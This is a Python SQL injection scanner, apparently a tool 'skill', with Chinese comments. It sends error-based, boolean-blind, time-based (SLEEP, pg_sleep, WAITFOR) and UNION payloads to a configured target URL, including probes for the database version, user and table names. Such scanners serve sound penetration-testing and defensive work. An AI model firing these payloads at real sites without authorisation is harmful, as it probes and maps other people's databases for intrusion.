"""
SQL 注入检测技能
支持错误注入、布尔盲注、时间盲注和 UNION 注入四种检测方式
"""
import json
import os
import sys
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class SQLiDetector:
    """SQL 注入检测器"""

    # 错误注入 Payload
    ERROR_PAYLOADS = [
        ("'", "SQL syntax.*MySQL|Warning.*mysql|MariaDB|PostgreSQL.*ERROR|SQLite.*error|ORA-[0-9]{5}|Microsoft OLE DB"),
        ('"', "SQL syntax.*MySQL|Warning.*mysql|MariaDB|PostgreSQL.*ERROR"),
        ("' OR '1'='1", "syntax error|unclosed quotation"),
        ("' OR 1=1--", "syntax error|unclosed quotation"),
        ("1' AND 1=1--", "syntax error"),
        ("1' AND 1=2--", "syntax error"),
        ("1' ORDER BY 1--", "syntax error|column"),
        ("1' ORDER BY 100--", "Unknown column|order by"),
        ("1' UNION SELECT NULL--", "syntax|SELECT"),
        ("1' UNION SELECT NULL,NULL--", "syntax|SELECT"),
        ("1' UNION SELECT NULL,NULL,NULL--", "syntax|SELECT"),
        ("' UNION SELECT @@version--", "version|syntax"),
        ("1 AND 1=1", "syntax error"),
        ("1 AND 1=2", "syntax error"),
    ]

    # 布尔盲注 Payload
    BOOLEAN_PAYLOADS = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' OR '1'='1", "' OR '1'='2"),
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("1' AND 1=1--", "1' AND 1=2--"),
        ('" AND "1"="1', '" AND "1"="2'),
        ("' AND 'x'='x", "' AND 'x'='y"),
        ("') AND ('1'='1", "') AND ('1'='2"),
        ('" AND 1=1--', '" AND 1=2--'),
    ]

    # 时间盲注 Payload
    TIME_PAYLOADS = [
        ("' OR SLEEP(3)--", "MySQL"),
        ("' OR pg_sleep(3)--", "PostgreSQL"),
        ("' OR (SELECT 1 FROM (SELECT(SLEEP(3)))a)--", "MySQL"),
        ("1' AND SLEEP(3)--", "MySQL"),
        ("1' AND pg_sleep(3)--", "PostgreSQL"),
        ("' WAITFOR DELAY '0:0:3'--", "MSSQL"),
        ("'; WAITFOR DELAY '0:0:3'--", "MSSQL"),
        ("' OR BENCHMARK(5000000,MD5('a'))--", "MySQL"),
        ("1' AND BENCHMARK(5000000,MD5('a'))--", "MySQL"),
        ("' OR (SELECT CASE WHEN (1=1) THEN SLEEP(3) ELSE 1 END)--", "MySQL"),
        ("' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE 1 END)--", "PostgreSQL"),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "MySQL"),
    ]

    # UNION 注入 Payload
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT database(),NULL,NULL--",
        "' UNION SELECT user(),NULL,NULL--",
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        '") UNION SELECT NULL--',
        "') UNION SELECT NULL--",
    ]

    def __init__(self, config: Dict[str, Any]):
        self.target_url = config["target_url"]
        self.method = config.get("method", "GET").upper()
        self.parameters = config.get("parameters", [])
        self.headers = config.get("headers", {})
        self.cookies = config.get("cookies", {})
        self.test_types = config.get("test_types", ["error", "boolean", "time", "union"])
        self.delay = config.get("delay", 0.5)
        self.timeout = config.get("timeout", 10)
        self.proxy = config.get("proxy")
        self.max_requests = config.get("max_requests", 100)

        self.session = self._create_session()
        self.findings: List[Dict[str, Any]] = []
        self.request_count = 0

    def _create_session(self) -> requests.Session:
        """创建带重试机制的 HTTP 会话"""
        session = requests.Session()

        retry_strategy = Retry(
            total=2,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        # 设置默认请求头
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        }
        session.headers.update(default_headers)

        if self.headers:
            session.headers.update(self.headers)

        if self.cookies:
            session.cookies.update(self.cookies)

        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}

        return session

    def _extract_parameters(self, url: str) -> List[Tuple[str, str]]:
        """从 URL 中提取参数"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return [(k, v[0]) for k, v in params.items()]

    def _build_test_url(self, param: str, payload: str) -> str:
        """构建带 payload 的测试 URL"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _send_request(
        self, url: str, method: str = "GET", data: Optional[Dict] = None
    ) -> Tuple[Optional[requests.Response], float]:
        """发送 HTTP 请求并计时"""
        if self.request_count >= self.max_requests:
            return None, 0.0

        self.request_count += 1
        start_time = time.time()

        try:
            if method == "GET":
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            elif method == "POST":
                resp = self.session.post(
                    url, data=data, timeout=self.timeout, allow_redirects=False
                )
            else:
                return None, 0.0

            elapsed = time.time() - start_time
            return resp, elapsed
        except requests.exceptions.Timeout:
            return None, self.timeout
        except requests.exceptions.ConnectionError:
            return None, 0.0
        except Exception as e:
            return None, 0.0

    def _check_error_pattern(self, response_text: str, pattern: str) -> bool:
        """检查响应中是否包含数据库错误模式"""
        import re

        if not response_text or not pattern:
            return False

        try:
            return bool(re.search(pattern, response_text, re.IGNORECASE))
        except re.error:
            return False

    def _test_error_based(self, param: str, original_value: str) -> List[Dict[str, Any]]:
        """错误注入检测"""
        results = []

        for payload, pattern in self.ERROR_PAYLOADS:
            test_url = self._build_test_url(param, payload)
            resp, _ = self._send_request(test_url)

            if resp is None:
                continue

            if self._check_error_pattern(resp.text, pattern):
                results.append(
                    {
                        "vulnerability_type": "error_based",
                        "vulnerable_url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"响应中包含数据库错误信息，匹配模式: {pattern}",
                        "severity": "high",
                        "details": {
                            "response_status": resp.status_code,
                            "error_pattern": pattern,
                            "response_snippet": resp.text[:500],
                        },
                    }
                )
                break  # 发现一个即可

            time.sleep(self.delay)

        return results

    def _test_boolean_based(
        self, param: str, original_value: str
    ) -> List[Dict[str, Any]]:
        """布尔盲注检测"""
        results = []

        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            true_url = self._build_test_url(param, true_payload)
            false_url = self._build_test_url(param, false_payload)

            true_resp, _ = self._send_request(true_url)
            time.sleep(self.delay)
            false_resp, _ = self._send_request(false_url)

            if true_resp is None or false_resp is None:
                continue

            # 比较响应差异
            true_len = len(true_resp.text)
            false_len = len(false_resp.text)
            true_status = true_resp.status_code
            false_status = false_resp.status_code

            # 响应长度显著不同或状态码不同
            len_diff = abs(true_len - false_len)
            if len_diff > 50 or true_status != false_status:
                results.append(
                    {
                        "vulnerability_type": "boolean_based",
                        "vulnerable_url": self.target_url,
                        "parameter": param,
                        "payload": f"True: {true_payload} / False: {false_payload}",
                        "evidence": (
                            f"布尔盲注差异: 真条件响应长度={true_len}, "
                            f"假条件响应长度={false_len}, "
                            f"差异={len_diff}字节, "
                            f"状态码差异: {true_status} vs {false_status}"
                        ),
                        "severity": "high",
                        "details": {
                            "true_response_length": true_len,
                            "false_response_length": false_len,
                            "true_status": true_status,
                            "false_status": false_status,
                            "length_difference": len_diff,
                        },
                    }
                )
                break

            time.sleep(self.delay)

        return results

    def _test_time_based(self, param: str, original_value: str) -> List[Dict[str, Any]]:
        """时间盲注检测"""
        results = []
        sleep_threshold = 2.5  # 超过此秒数视为可疑

        for payload, db_type in self.TIME_PAYLOADS:
            test_url = self._build_test_url(param, payload)
            _, elapsed = self._send_request(test_url)

            if elapsed >= sleep_threshold:
                results.append(
                    {
                        "vulnerability_type": "time_based",
                        "vulnerable_url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": (
                            f"时间盲注成功: 响应时间={elapsed:.2f}秒 "
                            f"(目标数据库: {db_type})"
                        ),
                        "severity": "high",
                        "details": {
                            "response_time": round(elapsed, 3),
                            "database_type": db_type,
                            "threshold": sleep_threshold,
                        },
                    }
                )
                break

            time.sleep(self.delay)

        return results

    def _test_union_based(self, param: str, original_value: str) -> List[Dict[str, Any]]:
        """UNION 注入检测"""
        results = []

        # 先测试列数
        null_counts = range(1, 11)
        correct_columns = 0

        for count in null_counts:
            nulls = ",".join(["NULL"] * count)
            payload = f"' UNION SELECT {nulls}--"
            test_url = self._build_test_url(param, payload)
            resp, _ = self._send_request(test_url)

            if resp and resp.status_code == 200:
                # 检查是否有错误信息
                error_patterns = [
                    "The used SELECT statements have a different number of columns",
                    "number of columns",
                    "column",
                ]
                import re

                has_error = any(
                    re.search(p, resp.text, re.IGNORECASE) for p in error_patterns
                )
                if not has_error:
                    correct_columns = count
                    results.append(
                        {
                            "vulnerability_type": "union_based",
                            "vulnerable_url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": (
                                f"UNION 注入成功: 发现 {count} 列可用，"
                                f"状态码 {resp.status_code}，响应长度 {len(resp.text)} 字节"
                            ),
                            "severity": "critical",
                            "details": {
                                "column_count": count,
                                "response_length": len(resp.text),
                                "response_status": resp.status_code,
                            },
                        }
                    )
                    break

            time.sleep(self.delay)

        return results

    def detect(self) -> Dict[str, Any]:
        """执行 SQL 注入检测"""
        start_time = time.time()

        # 提取参数
        if not self.parameters:
            self.parameters = [p[0] for p in self._extract_parameters(self.target_url)]

        if not self.parameters:
            return {
                "findings": [],
                "summary": {
                    "total_findings": 0,
                    "critical_count": 0,
                    "high_count": 0,
                    "medium_count": 0,
                    "low_count": 0,
                    "test_types_executed": [],
                    "total_requests": 0,
                    "duration_seconds": 0,
                    "error": "未找到可测试的参数",
                },
            }

        # 获取原始值
        original_params = dict(self._extract_parameters(self.target_url))

        # 执行各类检测
        for param in self.parameters:
            original_value = original_params.get(param, "1")

            if "error" in self.test_types:
                self.findings.extend(self._test_error_based(param, original_value))

            if "boolean" in self.test_types:
                self.findings.extend(self._test_boolean_based(param, original_value))

            if "time" in self.test_types:
                self.findings.extend(self._test_time_based(param, original_value))

            if "union" in self.test_types:
                self.findings.extend(self._test_union_based(param, original_value))

        # 统计
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        for finding in self.findings:
            sev = finding.get("severity", "info")
            if sev in severity_counts:
                severity_counts[sev] += 1

        duration = round(time.time() - start_time, 2)

        return {
            "findings": self.findings,
            "summary": {
                "total_findings": len(self.findings),
                "critical_count": severity_counts["critical"],
                "high_count": severity_counts["high"],
                "medium_count": severity_counts["medium"],
                "low_count": severity_counts["low"],
                "test_types_executed": self.test_types,
                "total_requests": self.request_count,
                "duration_seconds": duration,
            },
        }


def main():
    """主入口 - 读取输入，执行检测，写入输出"""
    input_path = "/input/input.json"
    output_path = "/output/results.json"

    try:
        # 读取输入
        with open(input_path, "r", encoding="utf-8") as f:
            config = json.load(f)

        # 验证必填字段
        if "target_url" not in config:
            raise ValueError("缺少必填字段: target_url")

        # 执行检测
        detector = SQLiDetector(config)
        results = detector.detect()

        # 写入输出
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)

        # 输出摘要到 stdout
        summary = results["summary"]
        print(f"[完成] SQL 注入检测完成")
        print(f"  - 发现漏洞: {summary['total_findings']} 个")
        print(f"  - 严重: {summary['critical_count']}, 高危: {summary['high_count']}")
        print(f"  - 总请求数: {summary['total_requests']}")
        print(f"  - 耗时: {summary['duration_seconds']} 秒")

        sys.exit(0)

    except FileNotFoundError:
        print(f"[错误] 输入文件不存在: {input_path}", file=sys.stderr)
        sys.exit(1)
    except json.JSONDecodeError as e:
        print(f"[错误] 输入文件 JSON 解析失败: {e}", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"[错误] 检测过程异常: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
